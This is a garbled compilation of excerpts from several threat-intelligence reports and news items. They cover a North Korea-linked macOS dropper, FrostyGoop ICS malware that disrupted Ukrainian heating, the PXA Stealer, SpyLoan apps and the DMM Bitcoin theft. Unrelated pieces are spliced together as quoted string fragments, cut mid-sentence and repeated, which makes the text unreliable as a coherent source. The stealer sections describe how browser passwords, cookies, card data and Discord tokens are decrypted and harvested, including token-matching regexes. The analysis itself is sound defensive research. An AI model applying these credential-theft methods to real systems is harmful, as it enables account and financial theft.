            "SentinelLabs has observed a suspected DPRK threat actor targeting Crypto-related businesses with novel multi-stage malware.\n",
            "We assess with high confidence that the same actor is responsible for earlier attacks attributed to BlueNoroff and the RustDoor/ThiefBucket and RustBucket campaigns.\n",
            "SentinelLabs observed the use of a novel persistence mechanism abusing the Zsh configuration file zshenv.\n",
            "The campaign, which we dubbed ‘Hidden Risk’, uses emails propagating fake news about cryptocurrency trends to infect targets via a malicious application disguised as a PDF file.\n",
            "Overview\n",
            "Cryptocurrency-related businesses have been targets of North Korean-affiliated threat actors for some time now, with multiple campaigns aiming to steal funds and/or insert backdoor malware into targets. In April 2023, researchers detailed an APT campaign targeting macOS users with multi-stage malware that culminated in a Rust backdoor capable of downloading and executing further malware on infected devices. ‘RustBucket’, as they labeled it, was attributed with strong confidence to the BlueNoroff APT. In May 2023, ESET researchers discovered a second RustBucket variant targeting macOS users, followed by Elastic’s discovery in July that year of a third variant that included a LaunchAgent for persistence. In November 2023, Elastic also reported on another DPRK campaign targeting blockchain engineers of a crypto exchange platform with KandyKorn malware. Further analysis by SentinelLabs was able to connect the KandyKorn and RustBucket campaigns.\n",
            "In early September 2024, the FBI began warning that North Korea was conducting “highly tailored, difficult-to-detect social engineering campaigns against employees of decentralized finance (“DeFi”), cryptocurrency, and similar businesses to deploy malware and steal company cryptocurrency”. Researchers from Jamf subsequently followed up on this report a few weeks later detailing an attack attempt that deployed malware masquerading as a Visual Studio updater.\n",
            "In October 2024, SentinelLabs observed a phishing attempt on a crypto-related industry that delivered a dropper application and a payload bearing many of the hallmarks of these previous attacks. We believe the campaign likely began as early as July 2024 and uses email and PDF lures with fake news headlines or stories about crypto-related topics. We dubbed this campaign ‘Hidden Risk’ and detail its operation and indicators of compromise below, including the use of a novel persistence mechanism abusing the zshenv configuration file.\n",
            "Infection Vector\n",
            "Initial infection is achieved via phishing email containing a link to a malicious application. The application is disguised as a link to a PDF document relating to a cryptocurrency topic such as “Hidden Risk Behind New Surge of Bitcoin Price”, “Altcoin Season 2.0-The Hidden Gems to Watch” and “New Era for Stablecoins and DeFi, CeFi”.\n",
            "The emails hijack the name of a real person in an unrelated industry as a sender and purport to be forwarding a message from a well-known crypto social media influencer. In the case of the ‘Hidden Risk’ pdf, the threat actors copied a genuine research paper entitled ‘Bitcoin ETF: Opportunities and risk’ by an academic associated with the University of Texas and hosted online by the International Journal of Science and Research Archive (IJSRA).\n",
            " The fake PDF displayed to targets (left) and the original source document hosted online (right) \n",
            "Unlike earlier campaigns attributed to BlueNoroff, the Hidden Risk campaign uses an unsophisticated phishing email that does not engage the recipient with contextually-relevant content, such as reference to personal or work-related information.\n",
            "Also of note is that the sender domain in our observed incident, kalpadvisory[.]com, has been noted for spamming among online communities involved in the Indian stock market.\n",
            " Social media users complain about spam calls from Kalp Advisory \n",
            "The ‘open’ link in the phishing email hides a URL to another domain, delphidigital[.]org. The full URL currently serves a benign form of the Bitcoin ETF document with titles that differ over time. However, at some point, this URL has or does switch to serving the first stage of a malicious application bundle entitled ‘Hidden Risk Behind New Surge of Bitcoin Price.app’ (3f17c5a7d1e7fd138163d8039e614b8a967a56cb).\n",
            " Application icon for the Stage 1 dropper \n",
            "First Stage | “Bait and Switch” Dropper Application Replaces PDF\n",
            "The first stage is a Mac application written in Swift displaying the same name as the expected PDF, “Hidden Risk Behind New Surge of Bitcoin Price.app”. The application bundle has the bundle identifier Education.LessonOne and contains a universal architecture (i.e., arm64 and x86-64) Mach-O executable named LessonOne.\n",
            "The application bundle was signed and notarized on 19 October, 2024 with the Apple Developer ID “Avantis Regtech Private Limited (2S8XHJ7948)”. The signature has since been revoked by Apple.\n",
            " Code signing details for the Hidden Risk Behind New Surge of Bitcoin Price.app \n",
            "On launch, the application downloads the decoy “Hidden Risk” pdf file from a Google Drive share and opens it using the default macOS PDF viewer (typically Preview). Similar TTPs have been previously reported by researchers at Kandji in August. The PDF is written into a temporary file before being moved to /Users/Shared using NSFileManager’s moveItemAtURL:toURL:error method.\n",
            "The malware then downloads and executes a malicious x86-64 binary sourced from matuaner[.]com via a URL hard-coded into the Stage 1 binary. Since by default macOS won’t allow an application to download from an insecure HTTP protocol, the application’s Info.plist specifies this domain in the dictionary for its NSAppTransportSecurity key and sets the NSExceptionAllowsInsecureHTTPLoads value to “true”.\n",
            " The Stage 1’s Info.plist adds the C2 domain as an exception for Apple’s App Transport Security settings \n",
            "The Info.plist also indicates that the application was built on a macOS 14.2 Sonoma machine but will run on both Intel and Apple silicon Macs with macOS 12 Monterey or later.\n",
            "Second Stage | ‘growth’ x86-64 Mach-O Backdoor\n",
            "The malicious binary downloaded by the first stage dropper is a single architecture Mach-O x86-64 executable (7e07765bf8ee2d0b2233039623016d6dfb610a6d), meaning that although the parent dropper will execute on both Intel and Apple silicon machines, the Stage 2 will only run on Intel architecture Macs or Apple silicon devices with the Rosetta emulation framework installed. The binary, written in C++, has the name ‘growth’, weighs in at around 5.1 MB and is not code signed at all (SentinelLabs was able to share the file for researchers here).\n",
            "The executable contains a number of identifiable functions, which we outline below, with the overall objective being to act as a backdoor to execute remote commands.\n",
            " Some interesting functions in the ‘growth’ binary \n",
            "On execution, the ‘growth’ binary performs the following actions.\n",

            "Runs several commands to gather environmental information from the host and generate a random UUID of length 16. These commands include sw_vers ProductVersion, sysctl hw.model and sysctl kern.boottime.\n",

The outage occurred after the Cyber Security Situation Center (CSSC), affiliated with the Security Service of Ukraine, disclosed details [PDF] of an attack on a municipal energy company in Ukraine in early 2024.\n",
            "FrostyGoop is the ninth reported OT-centric malware, but the first that used Modbus TCP communications to impact the power supply to heating services for over 600 apartment buildings. FrostyGoop can be used both within a compromised perimeter and externally if the target device is accessible over the internet. FrostyGoop sends Modbus commands to read or modify data on industrial control systems (ICS) devices, causing damage to the environment where attackers installed it.\n",
            "Based on this reporting, we conducted a deeper analysis and uncovered new samples of FrostyGoop and other related indicators. These new indicators include configuration files and libraries used by the malware, as well as artifacts associated with an infection. We also investigate network communications and provide new insights based on open-source intelligence (OSINT) data and our own telemetry.\n",

            "Attackers employed this malware associated with Russian actors in a cyberattack that caused a two-day heating system outage affecting over 600 apartment buildings in Ukraine, during sub-zero temperatures.\n",
            "According to an open-source report, attackers made the initial compromise through a vulnerability in a MikroTik router. However, we have not confirmed this delivery method and bad actors might instead have delivered the malware via OT devices exposed to the internet.\n",
            "FrostyGoop makes use of the Modbus TCP protocol to interact directly with ICS/OT devices, and therefore it is considered an ICS-centric malware. This is the ninth known ICS-centric malware.\n",
            "In addition, Modbus is one of the most common protocols used in critical infrastructure. During this attack, the adversaries dispatched Modbus commands to ENCO control devices, leading to inaccurate measurements and system malfunctions. Remediating these issues took nearly two days.\n",
            "Although bad actors used the malware to attack ENCO control devices, the malware can attack any other type of device that speaks Modbus TCP. Our telemetry indicates that 1,088,175 Modbus TCP devices were exposed to the internet from Sept. 2-Oct. 2, 2024, and 6,211,623 devices were exposed overall.\n",
            "The details needed by FrostyGoop to establish a Modbus TCP connection and send Modbus commands to a targeted ICS device can be provided as command-line arguments or included in a separate JSON configuration file.\n",
            "   Malware Samples Analysis \n",
            "FrostyGoop is compiled using the Go programming language, sometimes referred to as Golang. The malware uses a relatively obscure open-source Modbus implementation.\n",
            "Further analysis of the Modbus library revealed this implementation does not natively support supplying arguments using a JSON file, making this a strong identifier for the malware. Moreover, the JSON object structure follows a specific format based on the commands this malware supports. FrostyGoop also contains capabilities for logging the output to a console or to a JSON file.\n",
            "Attackers can supply two types of parameters to FrostyGoop:\n",
            "The first type of parameter consists of the possible operations an attacker can execute toward the registers of a Modbus device\n",
            "The second parameter consists of timing configurations.\n",

            "FrostyGoop also leverages Goccy’s go-json library, a faster JSON encoder and decoder compatible with the Go programming language standard package. In addition, it incorporates a specific open-source execution controller named queues. The relative obscurity of this code means it can serve as another possible indicator of FrostyGoop.\n",

            "Although not all FrostyGoop samples contain the strings shown in Figure 4, other strings contained within those libraries can serve as part of the detection for this malware.\n",
            "FrostyGoop also implements a debugger evasion technique by checking the value in Windows' Process Environment Block (PEB). Figure 5 shows this method in the disassembled code from a FrostyGoop sample. This method provides an alternative way to check the PEB's flag without calling .

            "* Cisco Talos discovered a new information stealing campaign operated by a Vietnamese-speaking threat actor targeting government and education entities in Europe and Asia.\n",
            "* We discovered a new Python program called PXA Stealer that targets victims’ sensitive information, including credentials for various online accounts, VPN and FTP clients, financial information, browser cookies, and data from gaming software.\n",
            "* PXA Stealer has the capability to decrypt the victim’s browser master password and uses it to steal the stored credentials of various online accounts.\n",
            "* The attacker has used complex obfuscation techniques for the batch scripts used in this campaign.\n",
            "* We discovered the attacker selling credentials and tools in the Telegram channel “Mua Bán Scan MINI,” which is where the [CoralRaider](https://blog.talosintelligence.com/coralraider-targets-socialmedia-accounts/) adversary operates, but we are not sure if the attacker belongs to the CoralRaider threat group or another Vietnamese cybercrime group.\n",
            "Victimology and targeted information\n",
            "The attacker is targeting the education sector in India and government organizations in European countries, including Sweden and Denmark, based on Talos telemetry data.\n",
            "The attacker’s motive is to steal the victim’s information, including credentials for various online accounts, browser login data, cookies, autofill information, credit card details, data from various cryptocurrency online and desktop wallets, data from installed VPN clients, gaming software accounts, chat messengers, password managers, and FTP clients.\n",
            "Attacker’s infrastructure\n",
            "Talos discovered that the attacker was hosting malicious scripts and the stealer program on a domain, tvdseo[.]com, in the directories “/file”, “/file/PXA/”, “/file/STC/”, and “/file/Adonis/”. The domain belongs to a Vietnamese professional search engine optimization (SEO) service provider; however, we are not certain whether the attacker has compromised the domain to host the malicious files or has subscribed to get legitimate access while still using it for their malicious purposes.\n",
            "We found that the attacker is using the Telegram bot for exfiltrating victims’ data. Our analysis of the payload, PXA Stealer, disclosed a few Telegram bot tokens and the chat IDs – controlled by the attacker.\n",

            "Attacker’s underground activities\n",
            "We identified attacker’s Telegram account “Lone None,” which was hardcoded in the PXA Stealer program and analyzed various details of the account, including the icon of Vietnam’s national flag and a picture of the emblem for Vietnam’s Ministry of Public Security, which aligns with our assessment that the attacker is of Vietnamese origin. Also, we found Vietnamese comments in the PXA Stealer program, which further strengthen our assessment.\n",
            "The attacker’s Telegram account has biography data that includes a link to a private antivirus checker website that allows users or buyers to assess the detection rate of a malware program. This website provides a platform for potential threat actors to evaluate the effectiveness and stealth capabilities of the malware before purchasing it, indicating a sophisticated level of service and professionalism in the threat actor's operations.\n",
            "We also discovered that the attacker is active in an underground Telegram channel, “Mua Bán Scan MINI,” mainly selling Facebook accounts, Zalo accounts, SIM cards, credentials, and money laundry data. Talos observed that this Vietnamese actor is also seen in the Telegram group in which the CoralRaider actor operates. However, we are not certain whether the actor is a member of the CoralRaider gang or another Vietnamese cybercrime group.\n",
            "Talos discovered that the attacker is also promoting another underground Telegram channel, “Cú Black Ads – Dropship,\" by sharing a few automation tools to manage large numbers of user accounts in their channel and conducting the exchanging or selling of information related to social media accounts, proxy services, and a batch account creator tool.\n",
            "The tools shared by the attacker in the group are automated utilities designed to manage several user accounts. These tools include a Hotmail batch creation tool, an email mining tool, and a Hotmail cookie batch modification tool. The compressed packages provided by the threat actor often contain not only the executable files for these tools but also their source code, allowing users to modify them as needed.\n",
            "Hotmail batch creation tool from telegram channel.\n",
            "Hotmail cookie batch modification tool from telegram channel.\n",
            "We found that the attacker is not sharing all the tools for free, and some of them require users to send a unique key back to the Telegram channel administrator for software activation. This process ensures that only those who have been vetted or have paid for the tool can access its full functionality. We also discovered that these tools are distributed on other websites, such as aehack[.]com, highlighting that they are selling the tools. Additionally, a [YouTube](https://www.youtube.com/watch?v=nBLueYeRugg) channel exists that provides tutorials on how to use these tools, further facilitating their widespread use and demonstrating the organized efforts to market and instruct potential users on their application.\n",
            "Infection Chain\n",
            "The attacker gains initial access by sending a phishing email with a ZIP file attachment, according to our telemetry data. The ZIP file contains a malicious loader executable file compiled in Rust language and a hidden folder called Photos. The hidden folder has other recurring folders, such as Documents and Images, that contain obfuscated Windows batch scripts and a decoy PDF document.\n",
            "When a victim extracts the attachment ZIP file, the hidden folder and the malicious Rust loader executable are dropped onto the victim machine. When the malicious Rust loader executable is run by the victim, it loads and executes multiple obfuscated batch scripts that are in the dropped hidden folders.\n",
            "We deobfuscated the Windows batch scripts using [CyberChef](https://gchq.github.io/CyberChef/), with each step in the process being crucial and requiring precise execution to achieve accurate deobfuscation. First, we employed regular expressions (regex) to filter out random characters consisting of uppercase and lowercase letters (A to Z). These random strings ranged in length from six to nine characters and were enclosed within “%” symbols. Next, we filtered out the “^” symbols and removed any remaining uppercase and lowercase letters (A to Z) as well as special characters “_,” /’(?),” “$,” “#,” and “[].” Finally, we eliminated the “%” symbols and we were able to successfully deobfuscate the scripts and reveal their PowerShell commands.\n",

The stealer accesses the master key file “Local State” located in the browser folder of the user’s profile directory, which contains the information of the encryption key used to encrypt the user data stored in the “Login Data” file, and decrypts it using the “CryptUnprotectData” function. This allows the attacker to gain access to the stored credentials and other sensitive browser information.\n",
            "Browser master key decryption function of PXA Stealer.\n",
            "The stealer also attempts to decrypts the master key that is stored in the key4.db file. Key4.db is a database used by Firefox (and some other Mozilla-based browsers) to store encryption keys, particularly the master key that encrypts sensitive data, such as saved passwords. The “getKey” function of the stealer is designed to extract and decrypt keys from the key4.db file using either AES or 3DES encryption methods, depending on the encryption used in the stored key.\n",
            "Browser master key decryption function of PXA Stealer.\n",
            "The stealer attempts to retrieve user profiles paths from the profiles.ini file of browser applications, including Mozilla Firefox, Pale Moon, SeaMonkey, Waterfox, Mercury, k-Melon, IceDragon, Cyberfox, and BlackHaw for further processing, such as extracting saved passwords or other user data.\n",
            "The stealer collects the victim’s login information from the browser’s login data file. The function “get_ch_login_data” of the stealer extracts login data, including URLs, usernames, and passwords, from the database “login_db”, which stores login information. The extracted login information is formatted into a string that includes the URL, username, decrypted password, browser, and profile.\n",
            "For each login entry in the browser login database, the function checks if the URL contains any important keywords that are hardcoded in the stealer program, and if a match is found, the login information is saved in a separate file named “Important_Logins.txt” located in the “Browsers Data” folder within the user’s profile temporary directory. The function saves all the results to “All_Passwords.txt” in the “Browsers Data” folder for other login data found in the database.\n",
            "Login credentials stealer function of PXA Stealer.\n",
            "The stealer executes another function, “get_ch_cookies”, to extract cookies from a specified browser's cookie database, decrypt them, and save the results to a file. First, it checks if the cookies database file exists in the specified profile directory and unlocks the cookies database file. The database file is then copied to the temporary folder and is processed by executing an SQL query to retrieve cookie information, including host key, name, path, encrypted value, expiration time, secure flag, and HTTP-only flag from the cookies database file.\n",
            "If any Facebook cookies are found, they are concatenated to a single string called \"fb_formatted\", and it calls another function, \"ADS_Checker()\", to check for ads based on the Facebook cookies, and the results are written to a file called \"Facebook_Cookies.txt”.

            "Browser cookie stealer JavaScript.\n",
            "Next, the stealer targets the victim’s credit card information stored in the browser database “webappsstore.sqlite”. The function extracts and decrypts saved credit card information from a browser's web data database. It checks if the cards database file \"cards_db\" exists and copies them to the user’s profile temporary folder. It executes a SQL query to retrieve credit card information including name on card, expiration month/year, encrypted card number, and date modified. Then it decrypts the encrypted card number using the function “decrypt_ch_value” with the help of the decrypted master key. It writes the cards’ information to a text file and names it after the browser and the profile. Finally, it gets the count of credit card information that was found and deletes the temporary copy of the “cards_db” file.\n",

Once the encrypted tokens are found, it decrypts them with the function “decrypt_dc_tokens()” using the extracted master key that was used to encrypt the tokens from the \"Local State\" file. Then, it validates the decrypted Discord tokens to check if it is a legitimate Discord token and stores it by associating it with the browser name. Besides searching for the encrypted tokens, the function also looks for unencrypted Discord tokens by searching strings that match the regular expression pattern \"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\" for standard tokens and \"mfa\\.[\\w-]{84}\" for multi-factor authentication (MFA) tokens in \".log\" and \".ldb\" files in the levelDB directory of Discord applications or web browsers where the structured key-value data is stored in levelDB database format.\n",
            "Discord token stealer function of PXA Stealer.\n",
            "The stealer executes another function to extract the user information from the MinSoftware application database. It searches for the database file \"db_maxcare.sqlite\" file on the victim machine folders, including Desktop, Documents, Downloads, OneDrive and in the logical partitions with the drive letters \"D:\\\" and \"E:\\\". Once found, it executes a SQL query to search in the accounts table of the database file and extracts the following data:\n",

            "SpyLoan is a repeat offender that dates back to 2020, with a report from ESET in December 2023 uncovering another set of 18 apps that sought to defraud users by offering them high-interest-rate loans, while stealthily also collecting their personal and financial information.\n",
            "The end goal of the financial scheme is to collect as much information as possible from infected devices, which could then be used to extort users by coercing them into paying the loans back at higher interest rates, and in some cases, for delayed payments or intimidating them with stolen personal photos.\n",
            "\"Ultimately, rather than providing genuine financial assistance, these apps can lead users into a cycle of debt and privacy violations,\" Ruiz said.\n",
            "Despite differences in the targeting, the apps have been found to share a common framework to encrypt and exfiltrate data from a victim's device to a command-and-control (C2) server. They also follow a similar user experience and onboarding process to apply for the loan.\n",
            " \n",
            "Furthermore, the apps request for a number of intrusive permissions that allow them to harvest system information, camera, call logs, contact lists, coarse location, and SMS messages. The data collection is justified by claiming it's required as part of user identification and anti-fraud measures.\n",
            "Users who register for the service are validated via a one-time password (OTP) to ensure they have a phone number from the target region. They are also urged to provide supplementary identification documents, bank accounts, and employee information, all of which are subsequently exfiltrated to the C2 server in encrypted format using AES-128.\n",
            "To mitigate the risks posed by such apps, it's essential to review app permissions, scrutinize app reviews, and confirm the legitimacy of the app developer before downloading them.\n",
            "\"The threat of Android apps like SpyLoan is a global issue that exploits users' trust and financial desperation,\" Ruiz said. \"Despite law enforcement actions to capture multiple groups linked to the operation of SpyLoan apps, new operators and cybercriminals continue to exploit these fraud activities.\"\n",

Dec 2, 2024, 7:26 a.m.     Japanese crypto exchange DMM Bitcoin will shut down and transfer its accounts and assets to trading platform SBI VC Trade in March next year, it said in a statement on Dec. 2. The decision was made after the exchange suffered a hack in May. Hackers siphoned off over 4502.9 bitcoin (BTC), worth nearly $305 million at the time. DMM Bitcoin had restricted its services such as withdrawals and the acceptance of purchase orders for spot crypto assets since the loss of the funds, but acknowledged that allowing the situation to continue would impair its customers. “We sincerely apologize for the inconvenience caused over such a long period of time,” it said. Who was behind the theft is not clear – though fingers have been pointed at North Korea’s shadowy cyberhackers the Lazarus Group. Money from the hack also appears to have passed through Huione Guarantee, a Cambodian payments company that has enabled the laundering of billions in illicit funds. SBI VC Trade said that the company would start handling 14 cryptocurrency new spot trading that are already handled by DMM Bitcoin before the transfer of the assets.

            "Malicious scripts\n",
            "During the campaign, the threat actors made some major changes to the script, while keeping the same distribution method. In almost all cases, a JS script named “Заявка на закупку…” (“Purchase request…”), “Запрос цен…” (“Request for quote…”), or similar was sent in a ZIP archive. Far more rarely, the scripts were called “Акт сверки…” (“Reconciliation statement…”), “Заявление на возврат…” (“Request for refund…”), “Досудебная претензия…” (“Letter of claim…”) or just “Претензия…” (“Claim…”). The earliest versions that we encountered in April and May used scripts with the HTA extension instead of JS scripts.\n",
            "For believability, besides the script, the attackers sometimes added to the archive various documents related to the organization or individual being impersonated. For example, an archive attached to a booking cancellation email contained a PDF file with a copy of a passport; while price request emails had extracts from the Russian Unified State Register of Legal Entities, certificates of tax registration and company cards in attachment. Below, we examine several versions of the scripts used in this campaign.\n",

            "     Decoy document in PNG format \n",
            "Note that PNG decoy documents are rather unconventional. Usually, bids and requests that are used to distract user attention from malware are distributed in office formats such as DOCX, XSLX, PDF and others. The most likely reason for using PNG is that in the very first versions the attackers hid the payload at the end of the bait file. PNG images make convenient containers because they continue to display correctly even after the payload is added.\n",
            "To download the decoy document, the attackers use the curl utility, which comes preinstalled on devices with Windows 10 (build 17063 and higher). Together with the document, using another built-in Windows utility, bitsadmin, the script downloads and runs the BAT file bat_install.bat to install the main payload. The script also makes use of bitsadmin for managing file transfer tasks.\n",

            "We assess with high confidence that the same actor is responsible for earlier attacks attributed to BlueNoroff and the RustDoor/ThiefBucket and RustBucket campaigns.\n",
            "SentinelLabs observed the use of a novel persistence mechanism abusing the Zsh configuration file zshenv.\n",
            "The campaign, which we dubbed ‘Hidden Risk’, uses emails propagating fake news about cryptocurrency trends to infect targets via a malicious application disguised as a PDF file.\n",
            "Overview\n",
            "Cryptocurrency-related businesses have been targets of North Korean-affiliated threat actors for some time now, with multiple campaigns aiming to steal funds and/or insert backdoor malware into targets. In April 2023, researchers detailed an APT campaign targeting macOS users with multi-stage malware that culminated in a Rust backdoor capable of downloading and executing further malware on infected devices. ‘RustBucket’, as they labeled it, was attributed with strong confidence to the BlueNoroff APT. In May 2023, ESET researchers discovered a second RustBucket variant targeting macOS users, followed by Elastic’s discovery in July that year of a third variant that included a LaunchAgent for persistence. In November 2023, Elastic also reported on another DPRK campaign targeting blockchain engineers of a crypto exchange platform with KandyKorn malware. Further analysis by SentinelLabs was able to connect the KandyKorn and RustBucket campaigns.\n",
            "In early September 2024, the FBI began warning that North Korea was conducting “highly tailored, difficult-to-detect social engineering campaigns against employees of decentralized finance (“DeFi”), cryptocurrency, and similar businesses to deploy malware and steal company cryptocurrency”. Researchers from Jamf subsequently followed up on this report a few weeks later detailing an attack attempt that deployed malware masquerading as a Visual Studio updater.\n",
            "In October 2024, SentinelLabs observed a phishing attempt on a crypto-related industry that delivered a dropper application and a payload bearing many of the hallmarks of these previous attacks. We believe the campaign likely began as early as July 2024 and uses email and PDF lures with fake news headlines or stories about crypto-related topics. We dubbed this campaign ‘Hidden Risk’ and detail its operation and indicators of compromise below, including the use of a novel persistence mechanism abusing the zshenv configuration file.\n",
            "Infection Vector\n",
            "Initial infection is achieved via phishing email containing a link to a malicious application. The application is disguised as a link to a PDF document relating to a cryptocurrency topic such as “Hidden Risk Behind New Surge of Bitcoin Price”, “Altcoin Season 2.0-The Hidden Gems to Watch” and “New Era for Stablecoins and DeFi, CeFi”.\n",
            "The emails hijack the name of a real person in an unrelated industry as a sender and purport to be forwarding a message from a well-known crypto social media influencer. In the case of the ‘Hidden Risk’ pdf, the threat actors copied a genuine research paper entitled ‘Bitcoin ETF: Opportunities and risk’ by an academic associated with the University of Texas and hosted online by the International Journal of Science and Research Archive (IJSRA).\n",
            " The fake PDF displayed to targets (left) and the original source document hosted online (right) \n",
            "Unlike earlier campaigns attributed to BlueNoroff, the Hidden Risk campaign uses an unsophisticated phishing email that does not engage the recipient with contextually-relevant content, such as reference to personal or work-related information.\n",
            "Also of note is that the sender domain in our observed incident, kalpadvisory[.]com, has been noted for spamming among online communities involved in the Indian stock market.\n",
            " Social media users complain about spam calls from Kalp Advisory \n",
            "The ‘open’ link in the phishing email hides a URL to another domain, delphidigital[.]org. The full URL currently serves a benign form of the Bitcoin ETF document with titles that differ over time. However, at some point, this URL has or does switch to serving the first stage of a malicious application bundle entitled ‘Hidden Risk Behind New Surge of Bitcoin Price.app’ (3f17c5a7d1e7fd138163d8039e614b8a967a56cb).\n",

            "First Stage | “Bait and Switch” Dropper Application Replaces PDF\n",
            "The first stage is a Mac application written in Swift displaying the same name as the expected PDF, “Hidden Risk Behind New Surge of Bitcoin Price.app”. The application bundle has the bundle identifier Education.LessonOne and contains a universal architecture (i.e., arm64 and x86-64) Mach-O executable named LessonOne.\n",
            "The application bundle was signed and notarized on 19 October, 2024 with the Apple Developer ID “Avantis Regtech Private Limited (2S8XHJ7948)”. The signature has since been revoked by Apple.\n",
            " Code signing details for the Hidden Risk Behind New Surge of Bitcoin Price.app \n",

            "In July 2024, the operational technology (OT)-centric malware FrostyGoop/BUSTLEBERM became publicly known, after attackers used it to disrupt critical infrastructure. The outage occurred after the Cyber Security Situation Center (CSSC), affiliated with the Security Service of Ukraine, disclosed details [PDF] of an attack on a municipal energy company in Ukraine in early 2024.\n",
            "FrostyGoop is the ninth reported OT-centric malware, but the first that used Modbus TCP communications to impact the power supply to heating services for over 600 apartment buildings. FrostyGoop can be used both within a compromised perimeter and externally if the target device is accessible over the internet. FrostyGoop sends Modbus commands to read or modify data on industrial control systems (ICS) devices, causing damage to the environment where attackers installed it.\n",
            "Based on this reporting, we conducted a deeper analysis and uncovered new samples of FrostyGoop and other related indicators. These new indicators include configuration files and libraries used by the malware, as well as artifacts associated with an infection. We also investigate network communications and provide new insights based on open-source intelligence (OSINT) data and our own telemetry.\n",
            "OT malware is an increasing concern of security professionals across the globe, and FrostyGoop provides a notable case study of this growing threat.\n",

            "Attackers employed this malware associated with Russian actors in a cyberattack that caused a two-day heating system outage affecting over 600 apartment buildings in Ukraine, during sub-zero temperatures.\n",
            "According to an open-source report, attackers made the initial compromise through a vulnerability in a MikroTik router. However, we have not confirmed this delivery method and bad actors might instead have delivered the malware via OT devices exposed to the internet.\n",
            "FrostyGoop makes use of the Modbus TCP protocol to interact directly with ICS/OT devices, and therefore it is considered an ICS-centric malware. This is the ninth known ICS-centric malware.\n",
            "In addition, Modbus is one of the most common protocols used in critical infrastructure. During this attack, the adversaries dispatched Modbus commands to ENCO control devices, leading to inaccurate measurements and system malfunctions. Remediating these issues took nearly two days.\n",
            "Although bad actors used the malware to attack ENCO control devices, the malware can attack any other type of device that speaks Modbus TCP. Our telemetry indicates that 1,088,175 Modbus TCP devices were exposed to the internet from Sept. 2-Oct. 2, 2024, and 6,211,623 devices were exposed overall.\n",
            "The details needed by FrostyGoop to establish a Modbus TCP connection and send Modbus commands to a targeted ICS device can be provided as command-line arguments or included in a separate JSON configuration file.\n",
            "   Malware Samples Analysis \n",
            "FrostyGoop is compiled using the Go programming language, sometimes referred to as Golang. The malware uses a relatively obscure open-source Modbus implementation.\n",
            "Further analysis of the Modbus library revealed this implementation does not natively support supplying arguments using a JSON file, making this a strong identifier for the malware. Moreover, the JSON object structure follows a specific format based on the commands this malware supports. FrostyGoop also contains capabilities for logging the output to a console or to a JSON file.\n",
            "Attackers can supply two types of parameters to FrostyGoop:\n",
            "The first type of parameter consists of the possible operations an attacker can execute toward the registers of a Modbus device\n",
            "The second parameter consists of timing configurations.\n",
            "Figure 1 shows an example of the first type of parameter for an operation using Tasks and Iplist under the register for .\n",

            " Figure 3. Binary Ninja showing FrostyGoop timing configuration in the registry entry under . \n",
            "FrostyGoop also leverages Goccy’s go-json library, a faster JSON encoder and decoder compatible with the Go programming language standard package. In addition, it incorporates a specific open-source execution controller named queues. The relative obscurity of this code means it can serve as another possible indicator of FrostyGoop.\n",
            "Figure 4 shows our analysis of a Windows executable file for FrostyGoop within the tool Binary Ninja. This analysis reveals URLs from open-source libraries for modbus, go-json and queues.\n",
            " Figure 4. Open-source libraries: Modbus, go-json and queues. \n",
            "Although not all FrostyGoop samples contain the strings shown in Figure 4, other strings contained within those libraries can serve as part of the detection for this malware.\n",
            "FrostyGoop also implements a debugger evasion technique by checking the value in Windows' Process Environment Block (PEB). Figure 5 shows this method in the disassembled code from a FrostyGoop sample. This method provides an alternative way to check the PEB's flag without calling . Attackers use this technique to detect and avoid debuggers used by malware analysts.\n",

Also, we found Vietnamese comments in the PXA Stealer program, which further strengthen our assessment.\n",
            "The attacker’s Telegram account has biography data that includes a link to a private antivirus checker website that allows users or buyers to assess the detection rate of a malware program. This website provides a platform for potential threat actors to evaluate the effectiveness and stealth capabilities of the malware before purchasing it, indicating a sophisticated level of service and professionalism in the threat actor's operations.\n",
            "We also discovered that the attacker is active in an underground Telegram channel, “Mua Bán Scan MINI,” mainly selling Facebook accounts, Zalo accounts, SIM cards, credentials, and money laundry data. Talos observed that this Vietnamese actor is also seen in the Telegram group in which the CoralRaider actor operates. However, we are not certain whether the actor is a member of the CoralRaider gang or another Vietnamese cybercrime group.\n",
            "Talos discovered that the attacker is also promoting another underground Telegram channel, “Cú Black Ads – Dropship,\" by sharing a few automation tools to manage large numbers of user accounts in their channel and conducting the exchanging or selling of information related to social media accounts, proxy services, and a batch account creator tool.\n",
            "The tools shared by the attacker in the group are automated utilities designed to manage several user accounts.

This process ensures that only those who have been vetted or have paid for the tool can access its full functionality. We also discovered that these tools are distributed on other websites, such as aehack[.]com, highlighting that they are selling the tools. Additionally, a [YouTube](https://www.youtube.com/watch?v=nBLueYeRugg) channel exists that provides tutorials on how to use these tools, further facilitating their widespread use and demonstrating the organized efforts to market and instruct potential users on their application.\n",

            "Login credentials stealer function of PXA Stealer.\n",
            "The stealer executes another function, “get_ch_cookies”, to extract cookies from a specified browser's cookie database, decrypt them, and save the results to a file. First, it checks if the cookies database file exists in the specified profile directory and unlocks the cookies database file.

It checks if the cards database file \"cards_db\" exists and copies them to the user’s profile temporary folder. It executes a SQL query to retrieve credit card information including name on card, expiration month/year, encrypted card number, and date modified.

Once the encrypted tokens are found, it decrypts them with the function “decrypt_dc_tokens()” using the extracted master key that was used to encrypt the tokens from the \"Local State\" file. Then, it validates the decrypted Discord tokens to check if it is a legitimate Discord token and stores it by associating it with the browser name. Besides searching for the encrypted tokens, the function also looks for unencrypted Discord tokens by searching strings that match the regular expression pattern \"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\" for standard tokens and \"mfa\\.[\\w-]{84}\" for multi-factor authentication (MFA) tokens in \".log\" and \".ldb\" files in the levelDB directory of Discord applications or web browsers where the structured key-value data is stored in levelDB database format.\n",

